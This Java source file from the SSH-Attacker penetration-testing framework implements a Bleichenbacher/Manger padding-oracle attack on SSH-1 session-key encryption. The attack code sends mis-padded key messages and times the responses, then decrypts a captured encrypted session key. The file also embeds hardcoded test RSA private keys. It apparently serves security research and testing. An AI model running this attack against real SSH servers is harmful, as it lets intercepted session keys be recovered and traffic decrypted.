/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import com.google.common.primitives.Bytes;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
import de.rub.nds.sshattacker.attacks.pkcs1.*;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
import de.rub.nds.sshattacker.attacks.pkcs1.util.PkcsManipulator;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.RunningModeType;
import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.exceptions.CryptoException;
import de.rub.nds.sshattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.sshattacker.core.protocol.common.ProtocolMessage;
import de.rub.nds.sshattacker.core.protocol.ssh1.message.ClientSessionKeyMessage;
import de.rub.nds.sshattacker.core.protocol.ssh1.message.ServerPublicKeyMessage;
import de.rub.nds.sshattacker.core.state.State;
import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.ParallelExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
import de.rub.nds.sshattacker.core.workflow.action.GenericReceiveAction;
import de.rub.nds.sshattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.sshattacker.core.workflow.action.SendAction;
import de.rub.nds.sshattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.sshattacker.core.workflow.factory.WorkflowTraceType;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.json.simple.JSONObject;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;

    private final List<CustomRsaPublicKey> publicKeys = new ArrayList<>();
    private CustomRsaPublicKey serverPublicKey, hostPublicKey;
    private CustomRsaPrivateKey serverPrivateKey, hostPrivateKey;

    // Host 2048
    private CustomRsaPrivateKey hostPrivatKey2048 =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "636A1F6A55D578A42B8CD473FB52C449EA45BCF7366B53DA692E160344C822100D39A7DD328F3E169F04E9430AAF8837BA9AC5429F558DD70368A78EED395B74F5B25D795AB55307250F4C833AFF5D00A9E09141B641A8F8CABFA4476529A0A96FEAF9458BDA645F3669F38F936A4C595A552192E3BAE4E7DF6269BD5AF0ACF3057AD089374B1C6A8B5421F8543DE8621BED4C77BDA4910F47949EB060FE18A91B1D72A2CB18B9905C1F5D0D5931B58565BF12EF1E42077998B42DF52A26E61E18A8A51262AE3E64D694C822E68DEEA837B74AAF924A6530A904FB34FD337B7F519E1D2E957B0EB8DDD8F4F17A3781F96AD8C0FAE25ADAAF463E24C8D6F107CB",
                            16),
                    new BigInteger(
                            "00DB293E00310C505B740A85E2E68E4C3DCC9D14841304B0F128A52838D2EFB8148EBCE158D0E0EE8C50191413A68444A8ECF816E22E149519AF6BE96AEB7EA5BE66948750A44AA3E291446AC8C47667A76E9E3512D9A4F24A5B1A30FF9842A1E8D96BB734707AD5412C2A0EA4C8F38F1A725ED15DA9BD35384C7409B1BCF1C071E3C7F9F4B9EA27D970741B5893B7E248B89D5818E618616D3377D38A6D19F22D5764617E82641D24295E126045FBAADE8DCB8C457DDA23B8126A768666CCF56C71B1A7D43E18F52A63933562D6F502315FDE205C90260A0187F82E6158F59BBB5F1F2F964A9FDE2B1D93252C47F58D5D2631988242449B79381020AC1D0B64E1",
                            16));
    private CustomRsaPublicKey hostPublicKey2048 =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "00DB293E00310C505B740A85E2E68E4C3DCC9D14841304B0F128A52838D2EFB8148EBCE158D0E0EE8C50191413A68444A8ECF816E22E149519AF6BE96AEB7EA5BE66948750A44AA3E291446AC8C47667A76E9E3512D9A4F24A5B1A30FF9842A1E8D96BB734707AD5412C2A0EA4C8F38F1A725ED15DA9BD35384C7409B1BCF1C071E3C7F9F4B9EA27D970741B5893B7E248B89D5818E618616D3377D38A6D19F22D5764617E82641D24295E126045FBAADE8DCB8C457DDA23B8126A768666CCF56C71B1A7D43E18F52A63933562D6F502315FDE205C90260A0187F82E6158F59BBB5F1F2F964A9FDE2B1D93252C47F58D5D2631988242449B79381020AC1D0B64E1",
                            16));
    // Server 1024
    private CustomRsaPrivateKey serverPrivateKey1024 =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "00A715E8718E5BC9595B480711D78DD285D4C8B8710B7EEC9F59D0846E19A02E6A2C37C04DD842488F525D9DE1905ED7EE2A41584FE90AFED5DB9008BBCAF5A9C8B23B5D08B49AFB05D83309A0ABAA71E2EBC01772CCD0283C11136E8425CF488152397213DE39303E64A1879B922DC7FA809691E54523AA93B6012789713AF61D",
                            16),
                    new BigInteger(
                            "00BAF37C20A26F75481D0FD852AF9E5A211999E1AF345D3C05D98BF851B45AC95D4F9E80AB4BAB441F7FAA5647F57A3306E6EA370811D84544EC057DA42C0B6FD2597F01C91D09AB07C0CA159F1E461F07F7DDF92451F35236AFBE3026AC149A0FCDD3FF54CA707D09C56B8C6F9A751C7325E2916542F0DE2B452EC7871FD81355",
                            16));
    private CustomRsaPublicKey serverPublicKey1024 =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "00BAF37C20A26F75481D0FD852AF9E5A211999E1AF345D3C05D98BF851B45AC95D4F9E80AB4BAB441F7FAA5647F57A3306E6EA370811D84544EC057DA42C0B6FD2597F01C91D09AB07C0CA159F1E461F07F7DDF92451F35236AFBE3026AC149A0FCDD3FF54CA707D09C56B8C6F9A751C7325E2916542F0DE2B452EC7871FD81355",
                            16));

    // Host 1024
    private CustomRsaPublicKey hostPublicKey1024 =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "00C6D5D18B3BDCA91AE922941730D7"
                                    + "BFF6F959CACC67609C571CA281148B"
                                    + "97F8CA742B85E9FABAF308E6BFED40"
                                    + "06B639159E19CCCD3FFF4374E905B3"
                                    + "D4FEE6B3F8867940FDAD622FF59E7E"
                                    + "8E7801C29D5BEB6004E1F127C1B37B"
                                    + "5BEDFF057F06FB133A21DA77B2B9FA"
                                    + "9E4CF72740F0049B30DC1CE23EB2B7"
                                    + "E6E92B129E1EFE67E3",
                            16));
    private CustomRsaPrivateKey hostPrivatKey1024 =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "0092FAA9AC0FB31CBA0CCE07C460D1"
                                    + "8B5088A02C7E0E88E6E8A9FD2207CA"
                                    + "ECAAF7150ABB31EBAAD84EA32C0AB7"
                                    + "C27E5F1230CD878BCD9BE7047BE040"
                                    + "3FD9B13624D9C822AB17C96615BB5A"
                                    + "875D1A076D282B2E9035FAC37DB066"
                                    + "82C8498BA624C77B0E1E2ECBE7AB5A"
                                    + "5A0342E20C54482D149A7F37F8EF4A"
                                    + "2C148CD3ADD6782189",
                            16),
                    new BigInteger(
                            "00C6D5D18B3BDCA91AE922941730D7"
                                    + "BFF6F959CACC67609C571CA281148B"
                                    + "97F8CA742B85E9FABAF308E6BFED40"
                                    + "06B639159E19CCCD3FFF4374E905B3"
                                    + "D4FEE6B3F8867940FDAD622FF59E7E"
                                    + "8E7801C29D5BEB6004E1F127C1B37B"
                                    + "5BEDFF057F06FB133A21DA77B2B9FA"
                                    + "9E4CF72740F0049B30DC1CE23EB2B7"
                                    + "E6E92B129E1EFE67E3",
                            16));
    // Server 768 Bit
    private CustomRsaPublicKey serverPublicKey768 =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "00CB2C65943BB603C0072D4C5AFD8B"
                                    + "C5155D57231F02D191A079A3758BCF"
                                    + "96E83318F0729D05437B543088D8A1"
                                    + "73675EE40E7506EFB09EDD62C868C5"
                                    + "27DB0768AB643AD09A7C42C6AD47DA"
                                    + "ACE6CD53C051E26E69AF472D0CFE17"
                                    + "322EC96499E529",
                            16));
    private CustomRsaPrivateKey serverPrivateKey768 =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "00B30F82CADCC13296E7FC5D420819"
                                    + "49EDE560A99C68208906F48D4248A1"
                                    + "00EFCE30D9A1398FED04619390D7D3"
                                    + "9AE0ECB7DFB6A5EC8CA6A491097680"
                                    + "9280CB64AF1F8C8B67739CF7093B34"
                                    + "4343419647B331CD9827953279BE6C"
                                    + "AC31C55BA6EF01",
                            16),
                    new BigInteger(
                            "00CB2C65943BB603C0072D4C5AFD8B"
                                    + "C5155D57231F02D191A079A3758BCF"
                                    + "96E83318F0729D05437B543088D8A1"
                                    + "73675EE40E7506EFB09EDD62C868C5"
                                    + "27DB0768AB643AD09A7C42C6AD47DA"
                                    + "ACE6CD53C051E26E69AF472D0CFE17"
                                    + "322EC96499E529",
                            16));

    // Test
    // Host 2048
    private CustomRsaPrivateKey hostPrivatKeyCustom =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "36BDABD4DC5CE64FAF60420BE9DB5D534CB1A5D7E4BE3BC455B71907EE5C9B69F6DCA7D326DFFD352E11BE3A02BFF5F801F97C54A813D373EE23D86374C4D5F010C2A964FF2945B3D988B1337B713F5831DA28C30D3A5986DAF6E7F7E4F4775957A3CBFBAEAE84E3A0A2AFE1D59C293903D2B39852C82AEB7B23ED0704D1FE69",
                            16),
                    new BigInteger(
                            "AB81705A90C69618E388795B521C2353E7E0B37B133D7780593C068C3E39D5D57CD67F07E3D76B3EF8213E2494732579223644A88CE48E5A3D6EEF208B20CEA5F50A99D42B0A915C765654175D35C9BC4DBC4432B499D890ED79315BAB7B3485595154A87F2F040B8ACC654A93A9C51F418163BDB3A2D57A092F7FBC10B4BF1D",
                            16));
    private CustomRsaPublicKey hostPublicKeyCustom =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "AB81705A90C69618E388795B521C2353E7E0B37B133D7780593C068C3E39D5D57CD67F07E3D76B3EF8213E2494732579223644A88CE48E5A3D6EEF208B20CEA5F50A99D42B0A915C765654175D35C9BC4DBC4432B499D890ED79315BAB7B3485595154A87F2F040B8ACC654A93A9C51F418163BDB3A2D57A092F7FBC10B4BF1D",
                            16));
    // Server 1024
    private CustomRsaPrivateKey serverPrivateKeyCustom =
            new CustomRsaPrivateKey(
                    new BigInteger(
                            "ABE6304FAE535001BBFA94474FA4178C012058518A93805A25EFD56932C365724B422CDE3EE038243367AE3C57876CE297E66531B2F027B1407DE77758200761FFE5F96360BE21DDB7ECAD61523319A8DAA65B5F00CF52F0DB2F3A2A929EDA11",
                            16),
                    new BigInteger(
                            "CC8E8480EB2E26580EA260146575CB10D215F71A46BBB62C98D854154579E372E193102FF359799C4D247A661F32C082EE5C1919B43889214C8310E6291E2B0B16818464BAE5A0374CACA0EB4814756B71C3E1F459AB4B8DE555D338CA30557F",
                            16));
    private CustomRsaPublicKey serverPublicKeyCustom =
            new CustomRsaPublicKey(
                    new BigInteger("010001", 16),
                    new BigInteger(
                            "CC8E8480EB2E26580EA260146575CB10D215F71A46BBB62C98D854154579E372E193102FF359799C4D247A661F32C082EE5C1919B43889214C8310E6291E2B0B16818464BAE5A0374CACA0EB4814756B71C3E1F459AB4B8DE555D338CA30557F",
                            16));

    /**
     * @param bleichenbacherConfig Manger attack config
     * @param baseConfig Base config
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        this(bleichenbacherConfig, baseConfig, new ParallelExecutor(1, 3));
    }

    /**
     * @param bleichenbacherCommandConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherCommandConfig,
            Config baseConfig,
            ParallelExecutor executor) {
        super(bleichenbacherCommandConfig, baseConfig);
        sshConfig = getSshConfig();
    }

    /**
     * Returns True, if the Sever is vulnerabily to Bleichenbacher`s attack, not implemented yet
     * because of missing tests.
     *
     * @return If the server is vulnerable to Bleichenbacher's attack or not
     */
    @Override
    public Boolean isVulnerable() {
        return hasOracle();
    }

    /**
     * Checks if the server has Bleichenbacher's oracle, is not implemented yed because of missing
     * testcase.
     *
     * @return If the server has Bleichenbacher's oracle or not
     */
    public boolean hasOracle() {
        return true;
    }

    /**
     * Fetches the transient public key from a key exchange. Note that multiple calls to this method
     * when connected to the same server can yield different keys.
     *
     * @return Transient public key
     */
    private void getServerPublicKey() {
        if (serverPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                serverPublicKey = publicKeys.get(0);
            } else {
                serverPublicKey = publicKeys.get(0);
            }
        }
    }

    private void getHostPublicKey() {
        if (hostPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                hostPublicKey = publicKeys.get(1);
            } else {
                hostPublicKey = publicKeys.get(1);
            }
        }
    }

    private void getPublicKeys() {
        List<CustomRsaPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
        if (fetchedRsaSsh1Keys.isEmpty()) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }
        publicKeys.clear();
        publicKeys.addAll(fetchedRsaSsh1Keys);
        LOGGER.info("Recived keys");
    }

    private String sendSinglePacket(byte[] msg) {

        Config sshConfig = getSshConfig();
        sshConfig.setWorkflowExecutorShouldClose(false);
        sshConfig.setDoNotEncryptMessages(false);
        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg);

        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
        trace.addSshAction(receiveOracleResultAction);

        State state = new State(sshConfig, trace);
        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
        workflowExecutor.executeWorkflow();

        ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
        LOGGER.warn("Received: {}", lastMessage.toString());
        System.exit(0);
        return lastMessage.toString();
    }

    private BigInteger[] RSAKeyPairGenerator(int bitlength) {
        BigInteger p;
        BigInteger q;
        BigInteger N;
        BigInteger phi;
        BigInteger e;
        BigInteger d;
        SecureRandom r;

        r = new SecureRandom();
        p = new BigInteger(bitlength / 2, 100, r);
        q = new BigInteger(bitlength / 2, 100, r);
        N = p.multiply(q);
        phi = p.subtract(BigInteger.ONE).multiply(q.subtract(BigInteger.ONE));
        e = new BigInteger("65537");
        while (phi.gcd(e).intValue() > 1) {
            e = e.add(new BigInteger("2"));
        }
        d = e.modInverse(phi);

        return new BigInteger[] {e, d, N};
    }

    /**
     * Performs a testing procedure with different paddings. Throws a CryptoException if an error
     * occurs during the process.
     *
     * @throws CryptoException if an error occurs during the process
     */
    private long testDifferentPaddings() throws CryptoException {

        // Receive keys from server
        getPublicKeys();
        getHostPublicKey();
        getServerPublicKey();

        // Create workflowtrace to receive cookie and calculate session id
        Config sshConfig = getSshConfig();
        sshConfig.setWorkflowExecutorShouldClose(false);
        sshConfig.setDoNotEncryptMessages(false);
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(sshConfig)
                        .createWorkflowTrace(
                                WorkflowTraceType.KEX_SSH1_ONLY, RunningModeType.CLIENT);

        ReceiveAction receiveAction = new ReceiveAction(new ServerPublicKeyMessage());
        trace.addSshAction(receiveAction);

        State state = new State(sshConfig, trace);
        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
        workflowExecutor.executeWorkflow();

        List<ProtocolMessage<?>> receivedMessages = receiveAction.getReceivedMessages();
        LOGGER.info("recived size: {}", receivedMessages.size());
        LOGGER.info(receivedMessages.get(0).toString());
        byte[] sessionID = null;
        if (!receivedMessages.isEmpty()
                && receivedMessages.get(0) instanceof ServerPublicKeyMessage) {

            byte[] sessionCookie =
                    ((ServerPublicKeyMessage) receivedMessages.get(0))
                            .getAntiSpoofingCookie()
                            .getValue();
            sessionID = calculateSessionID(sessionCookie);
            LOGGER.info("SessionID is: {}", ArrayConverter.bytesToRawHexString(sessionID));
            LOGGER.info("Cookie is: {}", ArrayConverter.bytesToRawHexString(sessionCookie));
        }

        // Cleanup old trace to remove already executed workflowelements, prevent creating a new
        // connection and use the existing one
        trace.removeSshAction(1);
        trace.removeSshAction(2);
        trace.removeSshAction(0);
        sshConfig.setWorkflowExecutorShouldOpen(false);
        sshConfig.setWorkflowExecutorShouldClose(true);
        // Create random session key, padd it wrong and create a correct session key message, set
        // the plain and the encrypted key to be used in later worfklow correctly
        Random random = new Random();
        byte[] sessionKey = new byte[32];
        random.nextBytes(sessionKey);

        byte[] encryptedSecret =
                PkcsManipulator.wrongPaddingSessionKey(
                        sessionID,
                        sessionKey,
                        config.isInner(),
                        config.isOuter(),
                        hostPublicKey,
                        serverPublicKey,
                        config.getManipulationType());

        ClientSessionKeyMessage clientSessionKeyMessage = new ClientSessionKeyMessage();
        ModifiableByteArray encryptedSecretArray = new ModifiableByteArray();
        ModifiableByteArray plainSecretArray = new ModifiableByteArray();
        encryptedSecretArray.setModification(
                ByteArrayModificationFactory.explicitValue(encryptedSecret));
        plainSecretArray.setModification(ByteArrayModificationFactory.explicitValue(sessionKey));
        clientSessionKeyMessage.setEncryptedSessioKey(encryptedSecretArray);
        clientSessionKeyMessage.setPlaintextSessioKey(plainSecretArray);
        trace.addSshAction(new SendAction(clientSessionKeyMessage));

        // receive answer from the server
        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
        trace.addSshAction(receiveOracleResultAction);

        long start = System.nanoTime();
        long requestTime = 0;
        try {
            workflowExecutor.executeWorkflow();
            long finish = System.nanoTime();
            requestTime = finish - start;

            // print results
            ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
            LOGGER.warn("Received: {} in {} ns", lastMessage.toShortString(), requestTime);

        } catch (WorkflowExecutionException | IndexOutOfBoundsException ex) {
            LOGGER.error("got a Parser Exception");
            LOGGER.info(
                    "Server replied with unknown message -> it seems to be working correctly since the message could not be parsed");
            long finish = System.nanoTime();
            requestTime = finish - start;
            LOGGER.warn("Received a fault in {} ns", requestTime);
        }

        sshConfig.setWorkflowExecutorShouldOpen(true);
        workflowExecutor.closeConnection();
        return requestTime;
    }

    public void doTimingMeasurement(int numberOfTries) {

        ArrayList<Long> longValues = new ArrayList<>();
        try {
            for (int i = 0; i < numberOfTries; i++) {
                longValues.add(testDifferentPaddings());
            }
            // testDifferentPaddings();
        } catch (CryptoException e) {
            throw new RuntimeException(e);
        }

        String filename = "filename";
        String manipulatedPadding = "nothing";
        if (config.isInner()) {
            filename = "inner.json";
            manipulatedPadding = "inner";
        } else if (config.isOuter()) {
            filename = "outer.json";
            manipulatedPadding = "outer";
        } else {
            filename = "allright.json";
        }

        JSONObject jo2 = new JSONObject();
        jo2.put("Times", longValues);
        jo2.put("Padding", manipulatedPadding);

        String jsonStr2 = jo2.toJSONString();

        File output_File2 = new File(filename);
        FileOutputStream outputStream2 = null;
        try {
            outputStream2 = new FileOutputStream(output_File2);
            byte[] strToBytes = jsonStr2.getBytes();
            outputStream2.write(strToBytes);

            outputStream2.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        LOGGER.warn(jsonStr2);

        System.exit(0);
    }

    @Override
    public void executeAttack() {
        if (!config.getSendSinglePacket().isEmpty()) {
            byte[] msg = ArrayConverter.hexStringToByteArray(config.getSendSinglePacket());
            LOGGER.info(sendSinglePacket(msg));
        }

        boolean randomKeys = false;

        OracleType oracleType = config.getOracleType();
        KeyLenght keyLenght = config.getKeyLenght();

        if (config.isTiming()) {
            doTimingMeasurement(config.getIntervall());
        }

        LocalDateTime dateTime = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss");
        String formattedDateTime = dateTime.format(formatter);
        String filename = formattedDateTime + "_benchmark_results.json";

        /*if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }*/

        if (oracleType.equals(OracleType.REAL)) {
            getPublicKeys();
            getHostPublicKey();
            getServerPublicKey();
        } else {
            if (!randomKeys) {
                switch (keyLenght) {
                    case SHORT:
                        serverPrivateKey = serverPrivateKey768;
                        serverPublicKey = serverPublicKey768;
                        hostPrivateKey = hostPrivatKey1024;
                        hostPublicKey = hostPublicKey1024;
                        break;
                    case LONG:
                        serverPrivateKey = serverPrivateKey1024;
                        serverPublicKey = serverPublicKey1024;
                        hostPrivateKey = hostPrivatKey2048;
                        hostPublicKey = hostPublicKey2048;
                        break;
                    default:
                        LOGGER.fatal(
                                "Error - you need to choose a valid Keylenght if oracle-Type is not 'real'");
                        throw new RuntimeException();
                }
            } else {
                int serverKeyLenght, hostKeyLenght;
                switch (keyLenght) {
                    case SHORT:
                        serverKeyLenght = 768;
                        hostKeyLenght = 1024;
                        break;
                    case LONG:
                        serverKeyLenght = 1024;
                        hostKeyLenght = 2048;
                        break;
                    default:
                        LOGGER.fatal(
                                "Error - you need to choose a valid Keylenght if oracle-Type is not 'real'");
                        throw new RuntimeException();
                }
                BigInteger[] serverKeyData = RSAKeyPairGenerator(serverKeyLenght);

                serverPrivateKey = new CustomRsaPrivateKey(serverKeyData[1], serverKeyData[2]);
                serverPublicKey = new CustomRsaPublicKey(serverKeyData[0], serverKeyData[2]);

                BigInteger[] hostKeyData = RSAKeyPairGenerator(hostKeyLenght);

                hostPrivateKey = new CustomRsaPrivateKey(hostKeyData[1], hostKeyData[2]);
                hostPublicKey = new CustomRsaPublicKey(hostKeyData[0], hostKeyData[2]);

                LOGGER.debug(
                        ArrayConverter.bytesToHexString(
                                hostPrivateKey.getPrivateExponent().toByteArray()));
                LOGGER.debug(
                        ArrayConverter.bytesToHexString(
                                hostPublicKey.getPublicExponent().toByteArray()));
                LOGGER.debug(
                        ArrayConverter.bytesToHexString(
                                serverPrivateKey.getPrivateExponent().toByteArray()));
                LOGGER.debug(
                        ArrayConverter.bytesToHexString(
                                serverPublicKey.getPublicExponent().toByteArray()));
            }
        }

        byte[] encryptedSecret;
        if (config.isBenchmark()) {
            LOGGER.info("Running in Benchmark Mode, generating encrypted Session Key");

            Random random = new Random();
            byte[] sessionKey = new byte[32];
            random.nextBytes(sessionKey);

            AbstractCipher innerEncryption;
            AbstractCipher outerEncryption;
            if (hostPublicKey.getModulus().bitLength() < serverPublicKey.getModulus().bitLength()) {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
            } else {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
            }

            try {
                sessionKey = innerEncryption.encrypt(sessionKey);
                encryptedSecret = outerEncryption.encrypt(sessionKey);
            } catch (CryptoException e) {
                throw new RuntimeException(e);
            }
        } else {
            LOGGER.info("Running in Live Mode, reading encrypted secret from commandline");
            if (config.getEncryptedSecret() == null) {
                throw new ConfigurationException(
                        "The encrypted secret must be set to be decrypted.");
            }
            encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        }

        if ((encryptedSecret.length * Byte.SIZE) > hostPublicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        // Create correct Oracle
        Pkcs1Oracle oracle;
        if (oracleType == OracleType.REAL) {
            oracle = new BleichenbacherOracle(hostPublicKey, serverPublicKey, getSshConfig());
        } else {
            try {
                oracle =
                        new Ssh1MockOracle(
                                hostPublicKey,
                                hostPrivateKey,
                                serverPublicKey,
                                serverPrivateKey,
                                oracleType);
            } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException e) {
                throw new RuntimeException(e);
            }
        }

        String attackType = "bardou";
        if (config.isClassic()) attackType = "classic";
        Bleichenbacher attacker =
                new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);
        if (config.isBenchmark()) {
            saveBenchmarkData(
                    filename,
                    attacker,
                    "".getBytes(StandardCharsets.UTF_8),
                    encryptedSecret,
                    0,
                    oracleType,
                    attackType);
        }

        long start = System.currentTimeMillis();
        LOGGER.info("Encrypted Secret: {}", ArrayConverter.bytesToHexString(encryptedSecret));

        attacker.attack(config.isClassic());

        long finish = System.currentTimeMillis();
        long timeElapsed = finish - start;
        LOGGER.info("The attack took {} milliseconds", timeElapsed);
        LOGGER.info(
                "It took {} tries for the inner and {} tries for the outer Bleichenbacher-Attack",
                attacker.getCounterInnerBleichenbacher(),
                attacker.getCounterOuterBleichenbacher());

        LOGGER.info(
                "Took on average {} ms for inner and {} ms for outer",
                attacker.getAverageTimeforRequestInnerOracle() / 1000000,
                attacker.getAverageTimeforRequestOuterOracle() / 1000000);
        BigInteger solution = attacker.getSolution();

        byte[] solutionByteArray = ArrayConverter.bigIntegerToByteArray(solution);

        CONSOLE.info("Decoded Solution: " + ArrayConverter.bytesToHexString(solutionByteArray));

        if (config.getCookie() != null) {
            byte[] cookieBytes = config.getCookie().getBytes();
            byte[] sessionID = calculateSessionID(cookieBytes);
            int i = 0;
            for (byte sesseionByte : sessionID) {
                solutionByteArray[i] = (byte) (sesseionByte ^ solutionByteArray[i++]);
            }
        }

        if (config.isBenchmark()) {
            saveBenchmarkData(
                    filename,
                    attacker,
                    solutionByteArray,
                    encryptedSecret,
                    timeElapsed,
                    oracleType,
                    attackType);
        }
    }

    private void saveBenchmarkData(
            String filename,
            Bleichenbacher attacker,
            byte[] solutionByteArray,
            byte[] encryptedSecret,
            long timeElapsed,
            OracleType oracleType,
            String attackType) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("plaintext", ArrayConverter.bytesToRawHexString(solutionByteArray));
            jo.put("ciphertext", ArrayConverter.bytesToRawHexString(encryptedSecret));
            jo.put("time", timeElapsed);
            jo.put("inner_tries", attacker.getCounterInnerBleichenbacher());
            jo.put("outer_tries", attacker.getCounterOuterBleichenbacher());
            jo.put("trimmed_outer", attacker.isOuterTrimmed());
            jo.put("trimmed_inner", attacker.isInnerTrimmed());
            jo.put("outer_trimmers", attacker.getOuterTrimmers());
            jo.put("inner_trimmers", attacker.getInnerTrimmers());
            jo.put("serverkey_lenght", serverPublicKey.getModulus().bitLength());
            jo.put("hostkey_lenght", hostPublicKey.getModulus().bitLength());
            jo.put("oracle_type", oracleType.toString());
            jo.put("attack_type", attackType);
            jo.put(
                    "average_ms_inner_oracle",
                    attacker.getAverageTimeforRequestInnerOracle() / 1000000);
            jo.put(
                    "average_ms_outer_oracle",
                    attacker.getAverageTimeforRequestOuterOracle() / 1000000);

            String jsonStr = jo.toJSONString();

            File output_File = new File(filename);
            FileOutputStream outputStream = new FileOutputStream(output_File);
            byte[] strToBytes = jsonStr.getBytes();
            outputStream.write(strToBytes);

            outputStream.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private byte[] calculateSessionID(byte[] cookie) {
        byte[] serverModulus;
        byte[] hostModulus;

        serverModulus = serverPublicKey.getModulus().toByteArray();
        hostModulus = hostPublicKey.getModulus().toByteArray();

        // Remove sign-byte if present
        if (hostModulus[0] == 0) {
            hostModulus = Arrays.copyOfRange(hostModulus, 1, hostModulus.length);
        }
        if (serverModulus[0] == 0) {
            serverModulus = Arrays.copyOfRange(serverModulus, 1, serverModulus.length);
        }

        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
        md.update(Bytes.concat(hostModulus, serverModulus, cookie));
        // md.update(Bytes.concat(serverModulus, hostModulus, cookie));
        byte[] sessionID = md.digest();
        LOGGER.debug("Session-ID {}", ArrayConverter.bytesToHexString(sessionID));

        return sessionID;
    }
}
